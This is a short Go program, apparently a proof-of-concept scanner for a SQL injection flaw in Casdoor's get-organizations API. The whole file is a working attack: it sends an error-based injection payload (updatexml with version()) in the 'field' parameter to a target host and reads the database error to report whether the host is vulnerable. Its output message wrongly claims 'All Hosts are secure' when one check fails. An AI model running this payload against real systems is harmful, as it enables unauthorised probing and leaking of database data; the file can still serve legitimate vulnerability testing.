package main

import (
	"fmt"
	"io"
	"log"
	"net/http"
	"strings"
)

func main() {
	resp, err := http.Get("http://www.example.com/api/get-organizations?p=123&pageSize=123&value=cfx&sortField=&sortOrder=&field=updatexml(null,version(),null)")
	if err != nil {
		log.Fatal(err)
	}
	defer resp.Body.Close()
	body, err := io.ReadAll(resp.Body)
	if err != nil {
		log.Fatal(err)
	}
	check := strings.Contains(string(body), "XPATH syntax error")
	if check == true {
		fmt.Println("Host is Vulnerbale for CASADOOR SQLI")
	} else {
		fmt.Println("All Hosts are secure")
	}
}
